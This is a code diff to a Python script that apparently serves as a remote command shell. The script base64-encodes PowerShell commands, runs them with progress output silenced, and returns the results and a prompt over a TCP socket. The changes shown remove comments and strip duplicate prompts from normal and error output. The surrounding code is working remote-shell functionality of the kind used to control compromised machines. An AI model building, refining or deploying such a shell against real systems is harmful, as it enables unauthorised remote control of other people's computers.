@@ -14,7 +14,6 @@ def encode_powershell_command(cmd: str) -> str:
     return base64.b64encode(cmd_bytes).decode('ascii')
 
 def run_powershell_command(command: str, cwd: str) -> str:
-    # Suppress progress, set output encoding, force plain text output with Out-String -Stream
     ps_command = (
         "$ProgressPreference = 'SilentlyContinue';"
         "$OutputEncoding = [Console]::OutputEncoding = [Text.Encoding]::UTF8;"
@@ -32,7 +31,6 @@ def run_powershell_command(command: str, cwd: str) -> str:
 def get_prompt():
     global cwd
     if mode == "ps":
-        # Just return cwd stored locally as prompt, no call to Get-Location
         return f"{cwd}> "
     else:
         try:
@@ -95,12 +93,20 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 ).strip()
 
             prompt = get_prompt()
-            # Send prompt and output separated by newline (no duplicate echo)
-            full_output = f"{prompt}\n{output}"
+
+            # Remove duplicate prompt from output start, if present
+            if output.startswith(prompt):
+                output = output[len(prompt):].lstrip("\r\n")
+
+            full_output = f"{prompt}{output and '\n' + output or ''}"
 
         except subprocess.CalledProcessError as e:
             prompt = get_prompt()
-            full_output = f"{prompt}\n{e.output.strip()}"
+            err_output = e.output.strip()
+            # Also remove duplicate prompt from error output start, if present
+            if err_output.startswith(prompt):
+                err_output = err_output[len(prompt):].lstrip("\r\n")
+            full_output = f"{prompt}{err_output and '\n' + err_output or ''}"
         except FileNotFoundError as e:
             prompt = get_prompt()
             full_output = f"{prompt}\n{str(e)}"
